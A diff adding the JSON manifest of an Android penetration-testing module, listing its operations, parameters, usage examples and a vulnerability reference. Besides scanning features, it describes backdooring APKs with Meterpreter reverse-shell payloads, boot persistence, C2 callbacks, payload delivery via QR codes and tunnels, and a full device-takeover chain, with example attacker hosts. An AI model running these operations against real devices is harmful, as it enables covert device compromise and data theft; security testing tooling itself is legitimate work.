@@ -1,0 +1,859 @@
+{
+  "name": "android_pentest",
+  "version": "2.0.0",
+  "category": "mobile",
+  "description": "Complete Android penetration testing suite with device reconnaissance, app analysis, vulnerability scanning, exploitation, network capture, and forensics",
+  "author": "SecVulnHub Team | 0xb0rn3",
+  "executable": "python3 android_pentest.py",
+  "dependencies": [
+    "python3",
+    "adb"
+  ],
+  "optional_dependencies": {
+    "aapt": "For APK analysis - apt install aapt",
+    "apktool": "For APK decompilation - apt install apktool",
+    "jadx": "For DEX to Java decompilation - apt install jadx",
+    "keytool": "For certificate analysis - included with JDK",
+    "frida": "For runtime instrumentation - pip3 install frida-tools",
+    "objection": "For Frida automation - pip3 install objection",
+    "requests": "For network operations - pip3 install requests",
+    "cryptography": "For certificate parsing - pip3 install cryptography"
+  },
+  "help": {
+    "description": "Android penetration testing framework covering device fingerprinting, static/dynamic app analysis, vulnerability scanning, exploitation testing, network traffic interception, and forensics. Detects 50+ vulnerability types including SQL injection, insecure storage, cleartext traffic, exported components, and more. Includes automated exploitation chains for common Android vulnerabilities.",
+    "parameters": {
+      "operation": {
+        "description": "Penetration testing operation to perform",
+        "type": "string",
+        "options": [
+          "recon",
+          "app_scan",
+          "vuln_scan",
+          "exploit",
+          "network",
+          "forensics",
+          "full",
+          "frida_hook",
+          "objection_patch",
+          "backdoor_apk",
+          "rebuild",
+          "deploy_shell",
+          "adb_wifi",
+          "get_root",
+          "exploit_cve",
+          "cve_chain",
+          "zero_click",
+          "persist",
+          "hook",
+          "unhook",
+          "device_net_scan",
+          "msf_handler",
+          "wan_expose",
+          "qr_exploit",
+          "inject_agent",
+          "full_pwn",
+          "multi_device"
+        ],
+        "default": "recon",
+        "examples": [
+          "recon          \u2014 Device fingerprint, root/bootloader/SELinux/patch-level",
+          "app_scan       \u2014 Static APK analysis, manifest, permissions, secret scan",
+          "vuln_scan      \u2014 Device + app CVE assessment",
+          "exploit        \u2014 Intent injection, SQLi on content providers, component abuse",
+          "network        \u2014 tcpdump capture + logcat credential leakage",
+          "forensics      \u2014 DB/SharedPreferences extraction, logcat, ADB backup",
+          "full           \u2014 Runs recon \u2192 app_scan \u2192 vuln_scan \u2192 exploit \u2192 network \u2192 forensics",
+          "frida_hook     \u2014 Deploy frida-server, SSL unpin, root bypass, dump creds, trace",
+          "objection_patch \u2014 Embed Frida gadget via Objection (no root at runtime)",
+          "backdoor_apk   \u2014 Pull APK, inject msfvenom payload (-x template), sign, reinstall",
+          "rebuild        \u2014 Rebuild boot persistence APK via build_bootbuddy.py (proven WAN C2)",
+          "deploy_shell   \u2014 Generate fresh msfvenom APK and install via adb",
+          "adb_wifi       \u2014 Enable ADB over TCP/WiFi (adb tcpip 5555)",
+          "get_root       \u2014 Multi-vector root: Magisk/su, adb root, CVE-2024-0044, mtk-su, KernelSU",
+          "exploit_cve    \u2014 Targeted CVE: CVE-2024-0044, CVE-2023-45866, CVE-2024-31317",
+          "cve_chain      \u2014 Chain multiple CVE exploits for privilege escalation",
+          "zero_click     \u2014 Zero-interaction vectors: NFC, BLE, WiFi",
+          "persist        \u2014 Boot Receiver persistence (no root), Magisk post-fs-data.d / service module",
+          "hook           \u2014 secV hook layer: monitor calls + C2 relay",
+          "unhook         \u2014 Remove secV hooks cleanly",
+          "device_net_scan \u2014 Scan device WiFi IP via netrecon",
+          "msf_handler    \u2014 Start msfrpcd Metasploit handler",
+          "wan_expose     \u2014 Expose MSF + APK server via Cloudflare Tunnel",
+          "qr_exploit     \u2014 QR code payload: APK URL, Intent URI, ADB wireless pairing, deeplink",
+          "inject_agent   \u2014 Push ARM64/shell agent, receive JSON recon + C2 callback",
+          "full_pwn       \u2014 Auto-chain: recon \u2192 adb_wifi \u2192 get_root \u2192 device_net_scan \u2192 deploy_shell \u2192 persist \u2192 wan_expose",
+          "multi_device   \u2014 Run any sub-operation on ALL connected devices simultaneously"
+        ]
+      },
+      "device": {
+        "description": "Android device serial number (auto-detected if not specified)",
+        "type": "string",
+        "required": false,
+        "examples": [
+          "emulator-5554",
+          "192.168.1.100:5555",
+          "device_serial_number"
+        ]
+      },
+      "package": {
+        "description": "Target package name for app-specific operations",
+        "type": "string",
+        "required": false,
+        "examples": [
+          "com.example.app",
+          "com.target.vulnerable"
+        ]
+      },
+      "frida": {
+        "description": "Enable Frida instrumentation and hooks",
+        "type": "boolean",
+        "default": false,
+        "requires": "frida-server running on device"
+      },
+      "proxy": {
+        "description": "Setup HTTP proxy on device",
+        "type": "boolean",
+        "default": false
+      },
+      "proxy_host": {
+        "description": "Proxy server IP (auto-detected if not specified)",
+        "type": "string",
+        "required": false,
+        "examples": [
+          "192.168.1.100",
+          "10.0.0.1"
+        ]
+      },
+      "proxy_port": {
+        "description": "Proxy server port",
+        "type": "integer",
+        "default": 8080
+      },
+      "bypass_ssl": {
+        "description": "Attempt SSL certificate pinning bypass",
+        "type": "boolean",
+        "default": false,
+        "methods": [
+          "frida",
+          "objection"
+        ]
+      },
+      "backup": {
+        "description": "Create full backup of app/device",
+        "type": "boolean",
+        "default": false
+      },
+      "search_secrets": {
+        "description": "Secret search in decompiled code",
+        "type": "boolean",
+        "default": true,
+        "patterns": [
+          "AWS keys",
+          "API keys",
+          "Passwords",
+          "Tokens",
+          "Private keys",
+          "JWT tokens",
+          "Credit cards",
+          "Email addresses",
+          "Phone numbers",
+          "URLs",
+          "IP addresses"
+        ]
+      },
+      "deep_analysis": {
+        "description": "Use jadx Java decompilation for deeper code analysis (slower)",
+        "type": "boolean",
+        "required": false,
+        "default": false
+      },
+      "cleanup": {
+        "description": "Delete work directory after operation completes",
+        "type": "boolean",
+        "required": false,
+        "default": false
+      },
+      "third_party_only": {
+        "description": "Only scan user-installed apps (skip system apps)",
+        "type": "boolean",
+        "required": false,
+        "default": true
+      },
+      "scan_limit": {
+        "description": "Max apps to scan when no package is specified",
+        "type": "integer",
+        "required": false,
+        "default": 5
+      },
+      "nvd_api_key": {
+        "description": "NVD API key for real-time CVE lookups (also reads NVD_API_KEY env var)",
+        "type": "string",
+        "required": false,
+        "default": ""
+      },
+      "lhost": {
+        "description": "Attacker IP or hostname for reverse shells and payload delivery (auto-detected from default route)",
+        "type": "string",
+        "required": false,
+        "default": "",
+        "examples": [
+          "192.168.1.42",
+          "attacker.example.com"
+        ]
+      },
+      "lport": {
+        "description": "Listener port for reverse shells and MSF handler",
+        "type": "integer",
+        "required": false,
+        "default": 4444
+      },
+      "payload": {
+        "description": "Metasploit payload for backdoor_apk / deploy_shell / msf_handler. Shorthand: tcp, http, https, shell, stageless.",
+        "type": "string",
+        "required": false,
+        "default": "android/meterpreter/reverse_tcp",
+        "options": [
+          "android/meterpreter/reverse_tcp",
+          "android/meterpreter/reverse_http",
+          "android/meterpreter/reverse_https",
+          "android/shell/reverse_tcp",
+          "android/meterpreter_reverse_tcp"
+        ]
+      },
+      "install": {
+        "description": "After backdoor_apk or deploy_shell: uninstall original and install backdoored APK on device",
+        "type": "boolean",
+        "required": false,
+        "default": false
+      },
+      "hook_mode": {
+        "description": "Frida hook mode for frida_hook operation",
+        "type": "string",
+        "required": false,
+        "default": "all",
+        "options": [
+          "all",
+          "ssl_unpin",
+          "root_bypass",
+          "dump_creds",
+          "trace"
+        ]
+      },
+      "hook_timeout": {
+        "description": "Seconds to keep Frida attached before detaching (frida_hook)",
+        "type": "integer",
+        "required": false,
+        "default": 30
+      },
+      "trace_method": {
+        "description": "Class or method substring to trace (used with hook_mode=trace)",
+        "type": "string",
+        "required": false,
+        "default": ""
+      },
+      "agent_mode": {
+        "description": "Agent behavior mode for inject_agent",
+        "type": "string",
+        "required": false,
+        "default": "recon",
+        "options": [
+          "recon",
+          "exploit",
+          "c2"
+        ]
+      },
+      "c2_host": {
+        "description": "Attacker IP for agent callback in inject_agent (auto-detected)",
+        "type": "string",
+        "required": false,
+        "default": ""
+      },
+      "c2_port": {
+        "description": "TCP port for agent C2 listener (inject_agent)",
+        "type": "integer",
+        "required": false,
+        "default": 8889
+      },
+      "c2_timeout": {
+        "description": "Seconds to wait for agent TCP callback (inject_agent)",
+        "type": "integer",
+        "required": false,
+        "default": 20
+      },
+      "escalate": {
+        "description": "Automatically issue ROOT_SHELL or SHELL when agent connects in exploit/c2 mode",
+        "type": "boolean",
+        "required": false,
+        "default": false
+      },
+      "qr_mode": {
+        "description": "QR code payload type for qr_exploit",
+        "type": "string",
+        "required": false,
+        "default": "apk",
+        "options": [
+          "apk",
+          "intent",
+          "adb_pair",
+          "deeplink",
+          "custom"
+        ]
+      },
+      "pair_port": {
+        "description": "Wireless ADB pairing port for qr_exploit mode=adb_pair (Android 11+)",
+        "type": "integer",
+        "required": false,
+        "default": 37001
+      },
+      "pair_code": {
+        "description": "Wireless ADB pairing code for qr_exploit mode=adb_pair",
+        "type": "string",
+        "required": false,
+        "default": "123456"
+      },
+      "cve": {
+        "description": "CVE identifier for exploit_cve operation (e.g. CVE-2024-0044)",
+        "type": "string",
+        "required": false,
+        "default": "",
+        "options": [
+          "CVE-2024-0044",
+          "CVE-2023-45866",
+          "CVE-2024-31317"
+        ]
+      },
+      "adb_port": {
+        "description": "TCP port to use when enabling ADB over WiFi (adb_wifi operation)",
+        "type": "integer",
+        "required": false,
+        "default": 5555
+      },
+      "serve_port": {
+        "description": "HTTP server port for APK delivery (wan_expose / qr_exploit)",
+        "type": "integer",
+        "required": false,
+        "default": 8888
+      },
+      "mirror": {
+        "description": "Enable screen mirroring and recording",
+        "type": "boolean",
+        "required": false,
+        "default": false
+      },
+      "record": {
+        "description": "Record screen video (30 seconds)",
+        "type": "boolean",
+        "required": false,
+        "default": false
+      },
+      "apk_path": {
+        "description": "Path to original boot persistence APK for rebuild operation (auto-pulled from device if omitted)",
+        "type": "string",
+        "required": false,
+        "default": ""
+      },
+      "out_path": {
+        "description": "Output APK path for rebuild operation (default: apk_backdoor/output/rebuilt.apk)",
+        "type": "string",
+        "required": false,
+        "default": ""
+      },
+      "msf": {
+        "description": "Merge msfvenom meterpreter into APK during rebuild (WAN C2 via bore tunnels)",
+        "type": "boolean",
+        "required": false,
+        "default": false
+      },
+      "msf_lport": {
+        "description": "Meterpreter callback port for rebuild --msf mode",
+        "type": "integer",
+        "required": false,
+        "default": 4444
+      }
+    },
+    "examples": [
+      {
+        "description": "Device reconnaissance",
+        "commands": [
+          "use android_pentest",
+          "run device"
+        ]
+      },
+      {
+        "description": "Static APK analysis",
+        "commands": [
+          "use android_pentest",
+          "set operation app_scan",
+          "set package com.target.app",
+          "set search_secrets true",
+          "run device"
+        ]
+      },
+      {
+        "description": "Frida SSL unpinning",
+        "commands": [
+          "use android_pentest",
+          "set operation frida_hook",
+          "set package com.target.app",
+          "set hook_mode ssl_unpin",
+          "run device"
+        ]
+      },
+      {
+        "description": "Backdoor an installed APK",
+        "commands": [
+          "use android_pentest",
+          "set operation backdoor_apk",
+          "set package com.target.app",
+          "set lhost 192.168.1.42",
+          "set lport 4444",
+          "set payload android/meterpreter/reverse_http",
+          "set install false",
+          "run device"
+        ]
+      },
+      {
+        "description": "Multi-vector root acquisition",
+        "commands": [
+          "use android_pentest",
+          "set operation get_root",
+          "run device"
+        ]
+      },
+      {
+        "description": "Boot persistence (no root via Boot Receiver)",
+        "commands": [
+          "use android_pentest",
+          "set operation persist",
+          "set lhost 192.168.1.42",
+          "set lport 4444",
+          "run device"
+        ]
+      },
+      {
+        "description": "WAN exposure via Cloudflare Tunnel",
+        "commands": [
+          "use android_pentest",
+          "set operation wan_expose",
+          "set lport 4444",
+          "set serve_port 8888",
+          "run no_device"
+        ]
+      },
+      {
+        "description": "QR code APK delivery",
+        "commands": [
+          "use android_pentest",
+          "set operation qr_exploit",
+          "set qr_mode apk",
+          "set lhost 192.168.1.42",
+          "set lport 8888",
+          "run no_device"
+        ]
+      },
+      {
+        "description": "Rebuild boot persistence APK with WAN meterpreter (proven)",
+        "commands": [
+          "use android_pentest",
+          "set operation rebuild",
+          "set lhost auto",
+          "set msf true",
+          "set msf_lport 4444",
+          "run device"
+        ]
+      },
+      {
+        "description": "Full automated pwn chain",
+        "commands": [
+          "use android_pentest",
+          "set operation full_pwn",
+          "set lhost 192.168.1.42",
+          "set lport 4444",
+          "run device"
+        ]
+      },
+      {
+        "description": "Run recon on all connected devices",
+        "commands": [
+          "use android_pentest",
+          "set operation multi_device",
+          "run device"
+        ]
+      }
+    ],
+    "features": [
+      "Device fingerprinting and reconnaissance",
+      "Root and bootloader detection",
+      "SELinux status analysis",
+      "Security patch level verification",
+      "Static APK analysis with AAPT/APKTool",
+      "AndroidManifest.xml security audit",
+      "Permission analysis (50+ dangerous permissions)",
+      "Component exposure detection",
+      "Code vulnerability scanning",
+      "Certificate validation and analysis",
+      "Security score calculation (0-100)",
+      "SQL injection testing in Content Providers",
+      "Intent injection vulnerability testing",
+      "Path traversal exploitation",
+      "Exported component enumeration and testing",
+      "Network traffic capture (requires root)",
+      "Insecure connection detection",
+      "Data leakage identification",
+      "Database extraction and analysis",
+      "SharedPreferences security audit",
+      "System log extraction and analysis",
+      "SMS/Contacts extraction (requires root)",
+      "Hardcoded credentials detection",
+      "Insecure cryptography identification",
+      "WebView vulnerability detection",
+      "Debuggable application detection",
+      "Backup enabled detection",
+      "Cleartext traffic detection",
+      "Known vulnerable app identification",
+      "ADB over network detection",
+      "World-readable file detection",
+      "Automated exploitation chains",
+      "Security reporting"
+    ],
+    "operations": {
+      "recon": {
+        "description": "Device reconnaissance and security posture assessment",
+        "checks": [
+          "Device model and manufacturer",
+          "Android version and SDK level",
+          "Architecture (ARM/x86)",
+          "Root status detection",
+          "Bootloader lock status",
+          "SELinux enforcement mode",
+          "Device encryption status",
+          "Screen lock configuration",
+          "Developer mode status",
+          "USB debugging status",
+          "ADB over network detection",
+          "Battery level and uptime",
+          "Kernel version",
+          "Build ID and security patch level"
+        ],
+        "output": "Device security profile"
+      },
+      "app_scan": {
+        "description": "Application security analysis",
+        "checks": [
+          "APK static analysis",
+          "Manifest security flags",
+          "Permission analysis",
+          "Component exposure",
+          "Code vulnerability patterns",
+          "Certificate validation",
+          "Native library detection",
+          "Obfuscation detection",
+          "Runtime analysis",
+          "Security score calculation"
+        ],
+        "detects": [
+          "Debuggable apps",
+          "Backup enabled",
+          "Cleartext traffic allowed",
+          "Excessive permissions",
+          "Exported components",
+          "Debug certificates",
+          "Outdated SDK versions",
+          "SQL injection vectors",
+          "Hardcoded secrets",
+          "Insecure crypto usage",
+          "WebView vulnerabilities",
+          "Intent hijacking risks"
+        ],
+        "output": "Detailed application security profile with risk assessment"
+      },
+      "vuln_scan": {
+        "description": "Vulnerability scanning",
+        "scans": [
+          "Device configuration vulnerabilities",
+          "Application security issues",
+          "Known vulnerable applications",
+          "Exposed network services",
+          "Insecure system settings",
+          "World-readable files",
+          "ADB security issues"
+        ],
+        "severity_levels": [
+          "CRITICAL",
+          "HIGH",
+          "MEDIUM",
+          "LOW",
+          "INFO"
+        ],
+        "output": "Prioritized vulnerability report with remediation advice"
+      },
+      "exploit": {
+        "description": "Ethical exploitation testing",
+        "tests": [
+          "Intent injection attacks",
+          "SQL injection in Content Providers",
+          "Path traversal exploitation",
+          "Exported component manipulation",
+          "Service hijacking",
+          "Activity launching attacks"
+        ],
+        "note": "All tests are non-destructive and ethical",
+        "output": "Exploitation proof-of-concepts and success indicators"
+      },
+      "network": {
+        "description": "Network traffic analysis and interception",
+        "capabilities": [
+          "Packet capture (tcpdump)",
+          "Protocol analysis",
+          "HTTP/HTTPS detection",
+          "DNS query monitoring",
+          "Insecure connection identification",
+          "Data leakage detection",
+          "Certificate validation"
+        ],
+        "requires": "Root access for packet capture",
+        "output": "Network traffic report with security findings"
+      },
+      "forensics": {
+        "description": "Data extraction and forensics analysis",
+        "extracts": [
+          "System configuration files",
+          "Application databases",
+          "SharedPreferences",
+          "System logs (main, system, crash)",
+          "SMS database (requires root)",
+          "Contacts database (requires root)",
+          "Call logs (requires root)",
+          "Application cache"
+        ],
+        "analyzes": [
+          "Sensitive data in logs",
+          "Credentials in preferences",
+          "Unencrypted databases",
+          "PII exposure"
+        ],
+        "output": "Forensics artifacts and sensitive data report"
+      },
+      "full": {
+        "description": "Complete penetration test",
+        "includes": [
+          "All recon checks",
+          "All app_scan checks",
+          "All vuln_scan checks",
+          "Exploitation testing",
+          "Network analysis",
+          "Forensics extraction"
+        ],
+        "output": "Security assessment report"
+      }
+    },
+    "vulnerability_database": {
+      "sql_injection": {
+        "severity": "CRITICAL",
+        "description": "SQL injection in Content Providers",
+        "impact": "Database manipulation, data exfiltration",
+        "remediation": "Use parameterized queries, validate input"
+      },
+      "hardcoded_secrets": {
+        "severity": "HIGH",
+        "description": "Hardcoded passwords, API keys, or tokens",
+        "impact": "Credential compromise, unauthorized access",
+        "remediation": "Store secrets in Android Keystore, use environment variables"
+      },
+      "insecure_crypto": {
+        "severity": "HIGH",
+        "description": "Weak cryptographic algorithms (DES, MD5, SHA1, ECB)",
+        "impact": "Data decryption, integrity compromise",
+        "remediation": "Use AES-256, SHA-256+, secure cipher modes"
+      },
+      "debuggable": {
+        "severity": "HIGH",
+        "description": "Application is debuggable in production",
+        "impact": "Memory inspection, code manipulation",
+        "remediation": "Set android:debuggable='false' in release builds"
+      },
+      "backup_enabled": {
+        "severity": "MEDIUM",
+        "description": "Backup is allowed via ADB",
+        "impact": "Data extraction via ADB backup",
+        "remediation": "Set android:allowBackup='false' for sensitive apps"
+      },
+      "cleartext_traffic": {
+        "severity": "HIGH",
+        "description": "Cleartext (HTTP) traffic is allowed",
+        "impact": "Man-in-the-middle attacks, data interception",
+        "remediation": "Enforce HTTPS, implement certificate pinning"
+      },
+      "exported_components": {
+        "severity": "MEDIUM",
+        "description": "Components exported without permission protection",
+        "impact": "Unauthorized access, intent hijacking",
+        "remediation": "Add permission requirements, validate inputs"
+      },
+      "webview_vulns": {
+        "severity": "HIGH",
+        "description": "WebView with JavaScript interface exposed",
+        "impact": "Code execution, XSS attacks",
+        "remediation": "Disable JavaScript when not needed, validate URLs"
+      },
+      "intent_hijacking": {
+        "severity": "MEDIUM",
+        "description": "Intent data not validated",
+        "impact": "Data injection, privilege escalation",
+        "remediation": "Validate all intent data, use explicit intents"
+      },
+      "path_traversal": {
+        "severity": "HIGH",
+        "description": "Path traversal in file operations",
+        "impact": "Unauthorized file access",
+        "remediation": "Validate and sanitize file paths"
+      },
+      "excessive_permissions": {
+        "severity": "MEDIUM",
+        "description": "App requests unnecessary dangerous permissions",
+        "impact": "Privacy concerns, attack surface increase",
+        "remediation": "Request only required permissions"
+      },
+      "debug_certificate": {
+        "severity": "HIGH",
+        "description": "Application signed with debug certificate",
+        "impact": "Identity spoofing, malicious updates",
+        "remediation": "Sign releases with production certificate"
+      },
+      "outdated_sdk": {
+        "severity": "MEDIUM",
+        "description": "Target SDK version is outdated",
+        "impact": "Missing security features",
+        "remediation": "Update to latest Android API level"
+      },
+      "root_detection": {
+        "severity": "INFO",
+        "description": "Device is rooted",
+        "impact": "All security controls can be bypassed",
+        "remediation": "Implement root detection and anti-tampering"
+      },
+      "adb_network": {
+        "severity": "CRITICAL",
+        "description": "ADB over network is enabled",
+        "impact": "Remote device access",
+        "remediation": "Disable ADB over network"
+      },
+      "world_readable": {
+        "severity": "MEDIUM",
+        "description": "World-readable files detected",
+        "impact": "Information disclosure",
+        "remediation": "Set proper file permissions"
+      }
+    },
+    "installation_tiers": {
+      "basic": "Device recon and basic app analysis (stdlib + adb)",
+      "standard": "Static APK analysis \u2014 add aapt, keytool (included with JDK)",
+      "full": "Code analysis \u2014 add apktool, jadx",
+      "runtime": "Frida instrumentation \u2014 pip3 install frida-tools objection"
+    },
+    "requirements": {
+      "basic": [
+        "Python 3.8+",
+        "adb"
+      ],
+      "standard": [
+        "aapt",
+        "keytool (JDK)"
+      ],
+      "full": [
+        "apktool",
+        "jadx"
+      ],
+      "runtime": [
+        "frida-tools",
+        "objection",
+        "requests",
+        "cryptography",
+        "msfvenom (Metasploit)"
+      ]
+    },
+    "notes": [
+      "\u26a0\ufe0f  AUTHORIZATION REQUIRED - Only test devices you own or have permission to test",
+      "\u26a0\ufe0f  Some operations require root access (network capture, forensics)",
+      "\u26a0\ufe0f  Exploitation testing is non-destructive and ethical only",
+      "\u26a0\ufe0f  Respect privacy laws and data protection regulations",
+      "\u26a0\ufe0f  Follow responsible disclosure practices",
+      "\ud83d\udca1 Start with 'recon' operation to understand device security posture",
+      "\ud83d\udca1 Use 'app_scan' for comprehensive application security analysis",
+      "\ud83d\udca1 'vuln_scan' provides prioritized vulnerability assessment",
+      "\ud83d\udca1 'exploit' operation tests for real-world exploitability",
+      "\ud83d\udca1 'network' operation requires root for packet capture",
+      "\ud83d\udca1 'forensics' extracts maximum data with root access",
+      "\ud83d\udca1 'full' operation combines all testing methods",
+      "\ud83d\udca1 Connect device via USB or ADB over network",
+      "\ud83d\udca1 Enable USB debugging in Developer Options",
+      "\ud83d\udca1 Accept ADB authorization prompt on device",
+      "\ud83d\udca1 Results saved to temporary directory with full details",
+      "\ud83d\udca1 Combine with other SecV modules for complete assessment"
+    ],
+    "legal_disclaimer": "This tool is designed exclusively for authorized security testing and research. Users must obtain explicit written permission before testing any Android devices or applications they do not own. Unauthorized access to mobile devices may violate computer fraud and abuse laws in your jurisdiction. The authors and contributors assume no liability for misuse. Always follow ethical hacking guidelines and responsible disclosure practices."
+  },
+  "inputs": {
+    "operation": {
+      "type": "string",
+      "description": "Penetration testing operation: recon, app_scan, vuln_scan, exploit, network, forensics, full",
+      "required": false,
+      "default": "recon"
+    },
+    "device": {
+      "type": "string",
+      "description": "Android device serial (auto-detected if not specified)",
+      "required": false,
+      "default": ""
+    },
+    "package": {
+      "type": "string",
+      "description": "Target package name for app-specific operations",
+      "required": false,
+      "default": ""
+    },
+    "c2_gui": {
+      "type": "bool",
+      "default": false,
+      "description": "Launch web C2 dashboard at http://localhost:8891"
+    },
+    "c2_cli": {
+      "type": "bool",
+      "default": false,
+      "description": "Start C2 server without opening browser"
+    },
+    "c2_port": {
+      "type": "int",
+      "default": 8891,
+      "description": "C2 GUI port"
+    }
+  },
+  "outputs": {
+    "operation": {
+      "type": "string",
+      "description": "Operation that was performed"
+    },
+    "device": {
+      "type": "object",
+      "description": "Complete device information and security profile"
+    },
+    "applications": {
+      "type": "array",
+      "description": "Array of analyzed application security profiles"
+    },
+    "vulnerabilities": {
+      "type": "array",
+      "description": "All detected vulnerabilities with severity and remediation"
+    },
+    "findings": {
+      "type": "array",
+      "description": "Security findings and observations"
+    },
+    "summary": {
+      "type": "object",
+      "description": "Executive summary with statistics and risk metrics"
+    }
+  },
+  "timeout": 600,
+  "concurrent": false
+}
